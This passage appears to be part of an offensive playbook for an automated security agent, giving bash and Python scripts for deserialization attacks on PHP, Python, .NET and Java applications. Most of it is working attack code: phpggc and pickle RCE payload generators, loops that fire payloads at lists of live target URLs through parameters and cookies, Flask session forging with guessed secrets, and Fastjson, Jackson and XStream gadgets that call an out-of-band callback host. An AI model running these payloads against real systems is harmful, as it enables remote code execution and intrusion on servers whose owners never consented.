# ‚îÇ CakePHP/RCE1            ‚îÇ CakePHP Framework                    ‚îÇ
# ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
2.2 Generate PHP RCE Payloads
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# phpggc_rce.sh

PHPGGC="temp/agent1/phpggc/phpggc"
CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")

mkdir -p temp/agent1/deser/php_rce

# Generate payloads for common frameworks
generate_php_payload() {
    local chain="$1"
    local cmd="$2"
    local output="$3"
    
    $PHPGGC "$chain" "$cmd" 2>/dev/null > "$output"
    
    if [ -s "$output" ]; then
        echo "[+] Generated: $chain"
    else
        rm -f "$output"
    fi
}

# Laravel chains (most common)
for i in $(seq 1 10); do
    generate_php_payload "Laravel/RCE${i}" "system" "curl https://laravel${i}.${CALLBACK}/rce" \
        "temp/agent1/deser/php_rce/laravel_rce${i}.txt"
done

# Symfony
for i in $(seq 1 4); do
    generate_php_payload "Symfony/RCE${i}" "exec" "curl https://symfony${i}.${CALLBACK}/rce" \
        "temp/agent1/deser/php_rce/symfony_rce${i}.txt"
done

# Guzzle
generate_php_payload "Guzzle/RCE1" "system" "curl https://guzzle.${CALLBACK}/rce" \
    "temp/agent1/deser/php_rce/guzzle_rce.txt"

# Monolog
for i in $(seq 1 3); do
    generate_php_payload "Monolog/RCE${i}" "system" "curl https://monolog${i}.${CALLBACK}/rce" \
        "temp/agent1/deser/php_rce/monolog_rce${i}.txt"
done

# Yii
generate_php_payload "Yii/RCE1" "curl https://yii.${CALLBACK}/rce" "" \
    "temp/agent1/deser/php_rce/yii_rce.txt"

# Doctrine
generate_php_payload "Doctrine/RCE1" "system" "curl https://doctrine.${CALLBACK}/rce" \
    "temp/agent1/deser/php_rce/doctrine_rce.txt"

echo "[*] PHP payloads generated in temp/agent1/deser/php_rce/"

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
2.3 Exploit PHP Targets
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# exploit_php_deser.sh

CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")

echo "[*] Exploiting PHP deserialization targets..."

while IFS='|' read -r url param type; do
    [ -z "$url" ] && continue
    [[ "$url" =~ ^# ]] && continue
    
    echo "[*] Target: $url (param: $param)"
    
    for payload_file in temp/agent1/deser/php_rce/*.txt; do
        [ -f "$payload_file" ] || continue
        
        chain=$(basename "$payload_file" .txt)
        payload=$(cat "$payload_file")
        
        # URL-encode the payload
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
        
        echo "  [*] Trying: $chain"
        
        # Test via GET parameter
        curl -sk "${url}?${param}=${encoded}" --max-time 15 &>/dev/null
        
        # Test via POST
        curl -sk "$url" -d "${param}=${encoded}" --max-time 15 &>/dev/null
        
        # Test via Cookie
        curl -sk "$url" -H "Cookie: ${param}=${encoded}" --max-time 15 &>/dev/null
        
        # Test common cookie names
        for cookie in "PHPSESSID" "session" "token" "auth"; do
            curl -sk "$url" -H "Cookie: ${cookie}=${encoded}" --max-time 10 &>/dev/null
        done
        
        sleep 0.3
    done
    
done < outputs/deser/php_deser_candidates.txt

echo "[*] Check interactsh for callbacks: ${CALLBACK}"

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
2.4 Laravel/Symfony Specific Exploitation
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# laravel_exploit.sh

PHPGGC="temp/agent1/phpggc/phpggc"
CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")

# Laravel uses encrypted cookies - need APP_KEY to encrypt payload
# But sometimes APP_KEY is exposed in debug mode or .env

# Check for Laravel debug mode
check_laravel_debug() {
    local url="$1"
    
    response=$(curl -sk "$url" 2>/dev/null)
    
    if echo "$response" | grep -qE "APP_KEY|Laravel|Whoops"; then
        echo "[+] Laravel detected: $url"
        
        # Look for exposed APP_KEY
        app_key=$(echo "$response" | grep -oP "APP_KEY['\"]?\s*[:=]\s*['\"]?base64:[A-Za-z0-9+/=]+")
        
        if [ -n "$app_key" ]; then
            echo "[!] APP_KEY EXPOSED: $app_key"
            echo "$url|$app_key" >> outputs/deser/php_rce_confirmed.txt
        fi
    fi
}

# Check targets
while IFS= read -r url; do
    check_laravel_debug "$url"
done < temp/agent1/live_base_urls.txt

================================================================================
PHASE 3: PYTHON PICKLE EXPLOITATION
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
3.1 Advanced Pickle Payloads
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/usr/bin/env python3
# pickle_exploit.py

import pickle
import base64
import struct
import os

# Callback domain
callback = open('outputs/interactsh_id.txt').read().strip() if os.path.exists('outputs/interactsh_id.txt') else 'CALLBACK.oast.fun'

os.makedirs('temp/agent1/deser/pickle_rce', exist_ok=True)

# Method 1: os.system (basic)
class OSSystem:
    def __reduce__(self):
        import os
        return (os.system, (f'curl https://os-system.{callback}/rce',))

# Method 2: subprocess.Popen (more reliable)
class SubprocessPopen:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (['curl', f'https://subprocess.{callback}/rce'],))

# Method 3: eval (for Python expression execution)
class EvalPayload:
    def __reduce__(self):
        return (eval, ("__import__('os').system('curl https://eval." + callback + "/rce')",))

# Method 4: exec (for multi-line code execution)
class ExecPayload:
    def __reduce__(self):
        code = f'''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Reverse shell code here
'''
        return (exec, (code,))

# Method 5: Bypass blacklist with builtins
class BuiltinsPayload:
    def __reduce__(self):
        return (getattr, 
                (__builtins__, 'eval'),
                ("__import__('os').system('id')",))

# Generate payloads
payloads = [
    ('os_system', OSSystem()),
    ('subprocess', SubprocessPopen()),
    ('eval', EvalPayload()),
]

for name, obj in payloads:
    # Protocol 0 (ASCII, most compatible)
    p0 = pickle.dumps(obj, protocol=0)
    with open(f'temp/agent1/deser/pickle_rce/{name}_p0.bin', 'wb') as f:
        f.write(p0)
    
    # Protocol 2 (binary, common)
    p2 = pickle.dumps(obj, protocol=2)
    with open(f'temp/agent1/deser/pickle_rce/{name}_p2.bin', 'wb') as f:
        f.write(p2)
    
    # Base64 encoded
    b64 = base64.b64encode(p2).decode()
    with open(f'temp/agent1/deser/pickle_rce/{name}_b64.txt', 'w') as f:
        f.write(b64)
    
    print(f'[+] Generated: {name}')

print(f'[*] Callback: {callback}')

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
3.2 Fickling - Decompile and Modify Pickles
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Install fickling
pip install fickling

# Decompile existing pickle
fickling temp/agent1/deser/pickle_rce/os_system_p2.bin

# Create malicious pickle from scratch
fickling --create "os.system('id')" -o temp/agent1/deser/custom_pickle.bin

# Inject into existing pickle
fickling --inject "os.system('id')" input.pkl -o output.pkl

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
3.3 Exploit Python Targets
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# exploit_python_pickle.sh

CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")

echo "[*] Exploiting Python pickle targets..."

# Flask apps commonly use pickle in:
# - Session cookies (signed but not encrypted)
# - Cache backends (Redis, Memcached)
# - Celery task queue

# Common parameter/cookie names
PARAMS=("session" "data" "pickle" "object" "state" "cache" "task")

while IFS= read -r url; do
    [ -z "$url" ] && continue
    [[ "$url" =~ ^# ]] && continue
    
    echo "[*] Target: $url"
    
    for payload_file in temp/agent1/deser/pickle_rce/*_b64.txt; do
        payload=$(cat "$payload_file")
        payload_name=$(basename "$payload_file" _b64.txt)
        
        for param in "${PARAMS[@]}"; do
            # GET parameter
            curl -sk "${url}?${param}=${payload}" --max-time 10 &>/dev/null
            
            # POST body
            curl -sk "$url" -d "${param}=${payload}" --max-time 10 &>/dev/null
            
            # Cookie
            curl -sk "$url" -H "Cookie: ${param}=${payload}" --max-time 10 &>/dev/null
        done
        
        echo "  [*] Tested: $payload_name"
    done
    
done < outputs/deser/python_deser_candidates.txt

echo "[*] Check interactsh for callbacks: ${CALLBACK}"

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
3.4 Flask Session Cookie Exploitation
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/usr/bin/env python3
# flask_session_forge.py

"""
Flask uses itsdangerous to sign session cookies.
If SECRET_KEY is known (leaked, default, weak), we can forge sessions.
"""

import base64
import zlib
from itsdangerous import URLSafeTimedSerializer, base64_decode
import pickle
import os

def decode_flask_cookie(cookie):
    """Decode Flask session cookie (without verification)"""
    try:
        payload = cookie.split('.')[0]
        
        # Add padding
        payload += '=' * (-len(payload) % 4)
        
        # Base64 decode
        data = base64.urlsafe_b64decode(payload)
        
        # Try zlib decompress
        try:
            data = zlib.decompress(data)
        except:
            pass
        
        return data
    except Exception as e:
        return None

def forge_flask_cookie(secret_key, payload_obj, salt='cookie-session'):
    """Forge Flask session cookie with known SECRET_KEY"""
    serializer = URLSafeTimedSerializer(secret_key)
    
    # Pickle payload
    payload = base64.b64encode(pickle.dumps(payload_obj)).decode()
    
    return serializer.dumps(payload)

# Example: Forge malicious session
class MaliciousSession:
    def __reduce__(self):
        return (os.system, ('curl https://flask.CALLBACK.oast.fun/rce',))

# Common Flask secret keys to try
COMMON_SECRETS = [
    'secret',
    'secret-key',
    'dev',
    'development',
    'changeme',
    'password',
    'supersecret',
    'flask-secret',
    'app-secret',
]

# Test each secret
for secret in COMMON_SECRETS:
    try:
        cookie = forge_flask_cookie(secret, MaliciousSession())
        print(f'[+] Generated cookie with secret "{secret}":')
        print(f'    {cookie[:50]}...')
        
        with open(f'temp/agent1/deser/flask_cookie_{secret}.txt', 'w') as f:
            f.write(cookie)
    except:
        pass

================================================================================
PHASE 4: .NET EXPLOITATION
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
4.1 ViewState Exploitation
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# ViewState without MAC = direct deserialization attack
# ViewState with known machine key = can forge valid MAC

# ysoserial.net gadgets for ViewState
DOTNET_GADGETS=(
    "TypeConfuseDelegate"
    "TextFormattingRunProperties"
    "ObjectDataProvider"
    "WindowsIdentity"
    "ActivitySurrogateSelector"
)

# Generate payload (requires Windows or Mono)
# ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "cmd /c curl https://dotnet.CALLBACK.oast.fun"

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
4.2 ViewState Forge with Known Machine Key
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/usr/bin/env python3
# viewstate_exploit.py

"""
If machineKey is known (from web.config leak), we can forge ViewState.
"""

import hmac
import hashlib
import base64

def forge_viewstate(payload, validation_key, validation='SHA1'):
    """Forge ViewState with known machineKey"""
    
    # Serialize payload (simplified)
    serialized = payload.encode()
    
    # Calculate MAC
    if validation == 'SHA1':
        mac = hmac.new(
            bytes.fromhex(validation_key),
            serialized,
            hashlib.sha1
        ).digest()
    elif validation == 'HMACSHA256':
        mac = hmac.new(
            bytes.fromhex(validation_key),
            serialized,
            hashlib.sha256
        ).digest()
    
    # Combine and base64
    forged = base64.b64encode(serialized + mac).decode()
    
    return forged

# Example usage
# validation_key from web.config leak
# <machineKey validationKey="..." decryptionKey="..." validation="SHA1"/>

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
4.3 Exchange/SharePoint Deserialization
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# CVE-2020-0688 - Exchange Server
# CVE-2019-0604 - SharePoint

# These often use known validation keys
# Exchange: CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF (default)

#!/bin/bash
# exchange_deser.sh

# Check for Exchange OWA
EXCHANGE_PATHS=(
    "/owa/"
    "/ecp/"
    "/autodiscover/"
    "/EWS/"
)

for base_url in $(cat temp/agent1/live_base_urls.txt); do
    for path in "${EXCHANGE_PATHS[@]}"; do
        url="${base_url}${path}"
        status=$(curl -sk -o /dev/null -w "%{http_code}" "$url")
        
        if [ "$status" != "404" ]; then
            echo "[+] Exchange endpoint: $url"
            echo "$url|exchange|potential_cve-2020-0688" >> outputs/deser/dotnet_deser_candidates.txt
        fi
    done
done

================================================================================
PHASE 5: JSON DESERIALIZERS (Fastjson/Jackson/XStream)
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
5.1 Fastjson Exploitation (Java)
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Fastjson auto-type vulnerabilities
# Payload triggers JNDI lookup ‚Üí RCE

CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")

# Fastjson 1.2.24 and earlier
cat > temp/agent1/deser/fastjson_1.json << EOF
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://${CALLBACK}:1389/Exploit",
    "autoCommit": true
}
EOF

# Fastjson 1.2.47 bypass
cat > temp/agent1/deser/fastjson_2.json << EOF
{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://${CALLBACK}:1389/Exploit",
        "autoCommit": true
    }
}
EOF

# Fastjson 1.2.68 bypass
cat > temp/agent1/deser/fastjson_3.json << EOF
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://${CALLBACK}:1389/Exploit",
    "autoCommit": true
}
EOF

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
5.2 Jackson Exploitation (Java)
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Jackson requires enableDefaultTyping() to be vulnerable

CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")

# Jackson gadget - needs specific classes on classpath
cat > temp/agent1/deser/jackson_1.json << EOF
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://${CALLBACK}:1389/Exploit","autoCommit":true}]
EOF

# Jackson - logback gadget
cat > temp/agent1/deser/jackson_2.json << EOF
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://${CALLBACK}/exec.sql'"}]
EOF

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
5.3 XStream Exploitation (Java)
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")

# XStream ProcessBuilder gadget
cat > temp/agent1/deser/xstream_rce.xml << EOF
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
    </default>
    <int>3</int>
    <dynamic-proxy>
      <interface>java.lang.Comparable</interface>
      <handler class='java.beans.EventHandler'>
        <target class='java.lang.ProcessBuilder'>
          <command>
            <string>curl</string>
            <string>https://${CALLBACK}/xstream-rce</string>
          </command>
        </target>
        <action>start</action>
      </handler>
    </dynamic-proxy>
    <string>anything</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
EOF

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
5.4 Test JSON Deserializers
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# test_json_deser.sh

CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")

# Update callback in payloads
sed -i "s/CALLBACK.oast.fun/${CALLBACK}/g" temp/agent1/deser/fastjson_*.json
sed -i "s/CALLBACK.oast.fun/${CALLBACK}/g" temp/agent1/deser/jackson_*.json
sed -i "s/CALLBACK.oast.fun/${CALLBACK}/g" temp/agent1/deser/xstream_*.xml

echo "[*] Testing JSON deserializers..."

# Find JSON endpoints
grep -iE "api|json|data" outputs/url_corpus_all_in_scope.txt | head -50 | \
while IFS= read -r url; do
    echo "[*] Testing: $url"
    
    # Fastjson payloads
    for payload_file in temp/agent1/deser/fastjson_*.json; do
        curl -sk "$url" \
            -H "Content-Type: application/json" \
            -d "@$payload_file" \
            --max-time 10 &>/dev/null
    done
    
    # Jackson payloads
    for payload_file in temp/agent1/deser/jackson_*.json; do
        curl -sk "$url" \
            -H "Content-Type: application/json" \
            -d "@$payload_file" \
            --max-time 10 &>/dev/null
    done
    
    # XStream payloads
    for payload_file in temp/agent1/deser/xstream_*.xml; do
        curl -sk "$url" \
            -H "Content-Type: application/xml" \
            -d "@$payload_file" \
            --max-time 10 &>/dev/null
    done
    
done

echo "[*] Check interactsh for callbacks"

================================================================================
PHASE 6: JNDI INJECTION (MARSHALSEC)
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
6.1 Setup marshalsec LDAP Server
